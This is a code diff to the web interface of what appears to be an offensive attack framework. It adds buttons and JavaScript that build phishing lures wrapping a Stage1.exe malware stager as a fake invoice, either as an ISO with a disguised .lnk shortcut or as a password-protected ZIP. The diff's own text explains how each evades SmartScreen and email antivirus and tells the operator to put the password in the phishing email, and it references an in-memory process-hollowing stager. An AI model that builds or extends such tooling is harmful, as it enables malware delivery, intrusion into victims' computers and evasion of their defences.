@@ -3465,6 +3465,51 @@ function renderStager() {
 </div>
 
 <div class="card" style="margin-top:8px">
+  <div class="card-title">&#128196; T1204.002 — File-Based Delivery (ISO+LNK &amp; Password ZIP)</div>
+  <div style="font-size:11px;color:var(--muted);margin-bottom:12px;line-height:1.6">
+    Both options deliver <b>Stage1.exe</b> disguised as a document. The target double-clicks a file that looks like a PDF — Stage1.exe runs silently in the background.
+  </div>
+
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
+
+    <!-- ISO + LNK -->
+    <div style="background:var(--bg2);border:1px solid var(--bg3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px">
+      <div style="font-size:12px;font-weight:700;color:var(--light)">&#128191; ISO + PDF LNK</div>
+      <div style="font-size:11px;color:var(--muted);line-height:1.5">
+        ISO auto-mounts on double-click (Win10+). Files inside have <b>no MOTW</b> → SmartScreen bypass.
+        LNK named <code>Invoice.pdf.lnk</code> → appears as <code>Invoice.pdf</code> (Windows hides .lnk by default).
+        LNK silently runs Stage1.exe from the ISO drive letter.
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <label style="font-size:11px;color:var(--muted)">Filename (shown to target)</label>
+        <input id="iso-fname" value="Invoice_Q4-2024" style="background:var(--bg);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:5px 8px;outline:none">
+      </div>
+      <button onclick="buildStagerIso()" style="background:var(--accent);color:var(--bg);border:none;border-radius:7px;padding:8px 14px;font-size:12px;font-weight:700;cursor:pointer;margin-top:auto">&#8659; Build ISO</button>
+      <div id="iso-err" style="font-size:11px;color:#f85149;display:none"></div>
+    </div>
+
+    <!-- Password ZIP -->
+    <div style="background:var(--bg2);border:1px solid var(--bg3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px">
+      <div style="font-size:12px;font-weight:700;color:var(--light)">&#128274; Password ZIP</div>
+      <div style="font-size:11px;color:var(--muted);line-height:1.5">
+        Email gateway AV <b>cannot scan</b> inside a password-protected ZIP.
+        Include the password in the phish email body (e.g. <i>"Password: infected"</i>).
+        Target unzips → double-clicks → Stage1.exe runs.
+      </div>
+      <div style="display:flex;flex-direction:column;gap:6px">
+        <label style="font-size:11px;color:var(--muted)">Inner filename</label>
+        <input id="zip-fname" value="Invoice_Q4-2024" style="background:var(--bg);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:5px 8px;outline:none">
+        <label style="font-size:11px;color:var(--muted)">ZIP password</label>
+        <input id="zip-pw" value="infected" style="background:var(--bg);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:5px 8px;outline:none">
+      </div>
+      <button onclick="buildStagerZip()" style="background:var(--bg3);color:var(--light);border:1px solid var(--bg3);border-radius:7px;padding:8px 14px;font-size:12px;font-weight:600;cursor:pointer;margin-top:auto">&#8659; Build ZIP</button>
+      <div id="zip-err" style="font-size:11px;color:#f85149;display:none"></div>
+    </div>
+
+  </div>
+</div>
+
+<div class="card" style="margin-top:8px">
   <div class="card-title">&#9881; C++ Stager — Stage1.exe (process hollowing, no disk write)</div>
   <div style="font-size:12px;color:var(--muted);margin-bottom:10px;line-height:1.7">
     <b>Stage1.exe</b> downloads the XOR-encrypted stage 2, decrypts it entirely in memory,
@@ -3603,6 +3648,45 @@ async function injectStagingPdf() {
   } catch(e) {
     if (errEl) { errEl.textContent = 'Network error: ' + e.message; errEl.style.display = 'block'; }
   }
+}
+
+function buildStagerIso() {
+  const fname  = document.getElementById('iso-fname')?.value || 'Invoice_Q4-2024';
+  const errEl  = document.getElementById('iso-err');
+  if (errEl) errEl.style.display = 'none';
+  const url = `${API_BASE}/api/stage/build-iso?filename=${encodeURIComponent(fname)}`;
+  fetch(url, { credentials: 'include' }).then(async r => {
+    if (!r.ok) {
+      const j = await r.json().catch(() => ({ error: r.statusText }));
+      if (errEl) { errEl.textContent = j.error || r.statusText; errEl.style.display = 'block'; }
+      return;
+    }
+    const blob = await r.blob();
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = fname + '.iso';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  }).catch(e => { if (errEl) { errEl.textContent = 'Network error: ' + e.message; errEl.style.display = 'block'; } });
+}
+
+function buildStagerZip() {
+  const fname  = document.getElementById('zip-fname')?.value || 'Invoice_Q4-2024';
+  const pw     = document.getElementById('zip-pw')?.value   || 'infected';
+  const errEl  = document.getElementById('zip-err');
+  if (errEl) errEl.style.display = 'none';
+  const url = `${API_BASE}/api/stage/build-zip?filename=${encodeURIComponent(fname)}&password=${encodeURIComponent(pw)}`;
+  fetch(url, { credentials: 'include' }).then(async r => {
+    if (!r.ok) {
+      const j = await r.json().catch(() => ({ error: r.statusText }));
+      if (errEl) { errEl.textContent = j.error || r.statusText; errEl.style.display = 'block'; }
+      return;
+    }
+    const blob = await r.blob();
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = fname + '.zip';
+    document.body.appendChild(a); a.click(); document.body.removeChild(a);
+  }).catch(e => { if (errEl) { errEl.textContent = 'Network error: ' + e.message; errEl.style.display = 'block'; } });
 }
 
 // ── Settings page ─────────────────────────────────────────────────────────────
